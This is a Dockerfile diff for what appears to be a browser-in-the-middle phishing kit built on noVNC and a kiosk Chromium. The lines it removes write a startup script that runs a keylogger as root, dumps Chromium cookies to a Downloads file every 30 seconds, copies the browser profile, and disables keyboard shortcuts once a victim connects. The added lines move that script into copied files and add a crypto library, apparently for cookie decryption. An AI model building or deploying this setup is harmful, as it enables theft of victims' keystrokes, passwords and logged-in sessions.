@@ -5,7 +5,7 @@ ENV DISPLAY :0
 ENV RESOLUTION 1920x1080x24
 ENV FOLDER default
 
-RUN apk add sudo bash xfce4 xvfb xdpyinfo lightdm-gtk-greeter x11vnc xfce4-terminal chromium python3 py3-pip git openssl curl gcc libc-dev python3-dev python3-tkinter && \
+RUN apk add sudo bash xfce4 xvfb xdpyinfo lightdm-gtk-greeter x11vnc xfce4-terminal chromium python3 py3-pip git openssl curl gcc libc-dev python3-dev python3-tkinter py3-pycryptodome py3-xlib wqy-zenhei && \
     rm -f /usr/bin/python && ln -s /usr/bin/python3 /usr/bin/python && \
     pip3 install pyxhook && \
     echo 'CHROMIUM_FLAGS="--disable-gpu --disable-software-rasterizer --disable-dev-shm-usage --kiosk --no-sandbox --password-store=basic --start-fullscreen --noerrdialogs --no-first-run"' >> /etc/chromium/chromium.conf && \
@@ -25,30 +25,10 @@ RUN mkdir -p /home/user/.vnc && x11vnc -storepasswd false /home/user/.vnc/passwd
     rm -rf /home/user/noVNC/utils/websockify/.git && \
     sudo apk del git
 
-RUN echo 'export DISPLAY=:0' > /home/user/kiosk.sh && \
-    echo 'mkdir /home/user/noVNC/$FOLDER && cp -r /home/user/noVNC/* /home/user/noVNC/$FOLDER/' >> /home/user/kiosk.sh && \
-    echo 'TITLE=$(curl -sk $WEBPAGE | grep "<title>" | grep "</title>" | sed "s/<[^>]*>//g")' >> /home/user/kiosk.sh && \
-    echo 'sed -i "124d" /home/user/noVNC/vnc_lite.html &&  sed  "131 i let path=\"$FOLDER/websockify\"" /home/user/noVNC/vnc_lite.html > /home/user/noVNC/index.html ' >> /home/user/kiosk.sh && \
-    echo 'echo $TITLE > title.txt && sed -i "4s/.*/$(cat title.txt)/g" noVNC/index.html' >> /home/user/kiosk.sh && \
-    echo 'sudo chmod a-rwx /usr/bin/xfce4-panel && sudo chmod a-rwx /usr/bin/thunar' >> /home/user/kiosk.sh && \
-    echo 'sudo mkdir Downloads 2> /dev/null && sudo chmod 777 -R Downloads && sudo chmod 777 kiosk.zip' >> /home/user/kiosk.sh && \
-    echo 'sudo mkdir -p /var/run/dbus && sudo dbus-daemon --config-file=/usr/share/dbus-1/system.conf --print-address' >> /home/user/kiosk.sh && \
-    echo 'unzip kiosk.zip && sleep 3 && /usr/bin/chromium-browser --load-extension=/home/user/kiosk/ $WEBPAGE &' >> /home/user/kiosk.sh && \
-    chmod +x /home/user/kiosk.sh
+#Copy files into the container
+COPY kiosk.sh /home/user/kiosk.sh
+COPY startVNC.sh /home/user/startVNC.sh
 
-RUN echo '/bin/bash -c /home/user/kiosk.sh &' > /home/user/startVNC.sh && \
-    echo 'nohup /bin/bash -c "while true; do if netstat | grep 5900 | grep ESTABLISHED ; then xfconf-query -c xfce4-keyboard-shortcuts -p /commands -r -R; break; fi; done" &' >> /home/user/startVNC.sh && \
-    echo 'nohup /bin/bash -c "sudo python3 /home/user/keylogger.py &"' >> /home/user/startVNC.sh && \
-    echo 'nohup /bin/bash -c "while true ; do sleep 30 ; sudo python3 cookies.py > Downloads/Cookies.txt ; done" &' >> /home/user/startVNC.sh && \
-    echo 'nohup /bin/bash -c "while true ; do sleep 30 ; cp -R /home/user/.config/chromium/Default /home/user/Downloads/ ; done" &' >> /home/user/startVNC.sh && \
-    echo 'sudo rm -f /tmp/.X${DISPLAY#:}-lock' >> /home/user/startVNC.sh && \
-    echo 'nohup /usr/bin/Xvfb $DISPLAY -screen 0 $RESOLUTION -ac +extension GLX +render -noreset > /dev/null || true &' >> /home/user/startVNC.sh && \
-    echo 'while [[ ! $(xdpyinfo -display $DISPLAY 2> /dev/null) ]]; do sleep .3; done' >> /home/user/startVNC.sh && \
-    echo 'nohup startxfce4 > /dev/null || true &' >> /home/user/startVNC.sh && \
-    echo 'sudo rm -f ~/.config/xfce4/xfconf/xfce-perchannel-xml/xfce4-keyboard-shortcuts.xml' >> /home/user/startVNC.sh && \
-    echo 'nohup x11vnc -xkb -noxrecord -noxfixes -noxdamage -many -shared -display $DISPLAY -rfbauth /home/user/.vnc/passwd -rfbport 5900 "$@" &' >> /home/user/startVNC.sh && \
-    echo 'nohup /home/user/noVNC/utils/novnc_proxy --web /home/user/noVNC/ --vnc localhost:5900 --listen 5980' >> /home/user/startVNC.sh && \
-    chmod +x /home/user/startVNC.sh
 
 COPY Files/cookies.py /home/user/
 COPY Files/vnc_lite.html /home/user/noVNC/
@@ -56,6 +36,8 @@ COPY Files/cursor.js /home/user/noVNC/core/util/
 RUN sed -i 's/rgb(40, 40, 40)/white/' /home/user/noVNC/core/rfb.js
 RUN sed -i 's/qualityLevel = 6/qualityLevel = 9/' /home/user/noVNC/core/rfb.js
 RUN sed -i 's/compressionLevel = 2/compressionLevel = 0/' /home/user/noVNC/core/rfb.js
+RUN chmod +x /home/user/kiosk.sh
+RUN chmod +x /home/user/startVNC.sh
 COPY Files/ui.js /home/user/noVNC/app/
 COPY Files/kiosk.zip /home/user/
 COPY Files/keylogger.py /home/user/
